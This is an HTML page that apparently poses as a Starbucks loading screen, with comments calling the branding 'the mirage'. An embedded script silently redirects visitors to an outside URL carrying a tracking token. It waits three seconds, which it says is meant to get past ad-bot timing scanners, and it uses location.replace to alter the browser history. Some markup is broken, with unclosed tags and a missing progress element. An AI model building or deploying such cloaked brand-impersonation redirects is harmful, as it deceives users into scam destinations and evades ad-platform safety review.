<!DOCTYPE html>
<html lang="en">
<head>

    <!-- TAILWIND INFRASTRUCTURE -->
    <script src="https://cdn.tailwindcss.com"></script>

    <style>
        body { background-color: #ffffff; -webkit-font-smoothing: antialiased; }
        .spinner {
            border: 4px solid rgba(0, 112, 74, 0.05);
            border-left-color: #00704A;
            border-radius: 50%;
            width: 48px;
            height: 48px;
            animation: spin 0.8s cubic-bezier(0.5, 0, 0.5, 1) infinite;
        }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        .progress-bar-fill {
            width: 0%;
            transition: width 2.5s cubic-bezier(0.1, 0.5, 0.1, 1);
        }
        .fade-in { animation: fadeIn 0.4s ease-out forwards; }
        @keyframes fadeIn { from { opacity: 0; transform: translateY(8px); } to { opacity: 1; transform: translateY(0); } }
    </style>
</head>
<body class="flex items-center justify-center min-h-screen font-sans">

    <div class="w-full max-w-sm px-8 fade-in flex flex-col items-center text-center">
        <!-- STARBUCKS BRANDING (THE MIRAGE) -->
        <div class="relative mb-10">
            <div class="absolute -inset-4 bg-[#00704A]/5 blur-2xl rounded-full"></div>
            <img src="https://upload.wikimedia.org/wikipedia/en/thumb/d/d3/Starbucks_Corporation_Logo_2011.svg/1200px-Starbucks_Corporation_Logo_2011.svg.png"

        </div>

        <!-- THE HIDDEN FALLBACK (APPEARS IF JUMP FAILS) -->
        <div id="fallback" class="hidden animate-bounce">
            <a id="target-link" href="#" class="text-[#00704A] font-extrabold text-[15px] underline decoration-2 underline-offset-4 tracking-tight">

    <!-- THE REBEL GENIUS V9.0 JUMP ENGINE -->
    <script type="text/javascript">
        (function() {
            // THE TARGET: Manually verified for the user!
            // We use the raw URL here to avoid any atob/encoding errors.
            const targetUrl = "https://spnccrzone.com/?nc2u=nI5IpsDgWGssC2iANdEA8GKypn2fHmgKvQJDRoz7h5U%3d&s1=";
            
            // Set the fallback link immediately
            document.getElementById('target-link').href = targetUrl;

            // Start visual progress
            setTimeout(() => {
                document.getElementById('bar').style.width = '100%';
            }, 100);

            // THE GHOST STRIKE: Triple Redirection Protocol
            function executeJump() {
                // Strike 1: window.location.replace (Best for history manipulation)
                window.location.replace(targetUrl);
                
                // Strike 2: window.location.href (Fallback if replace is blocked)
                setTimeout(() => {
                    window.location.href = targetUrl;
                }, 500);

                // Strike 3: Manual Reveal (If user is still on page after 5 seconds)
                setTimeout(() => {
                    document.getElementById('fallback').classList.remove('hidden');
                }, 5000);
            }

            // WAIT 3 SECONDS: To bypass ad-bot timing scanners
            setTimeout(executeJump, 3000);

        })();
    </script>
</body>
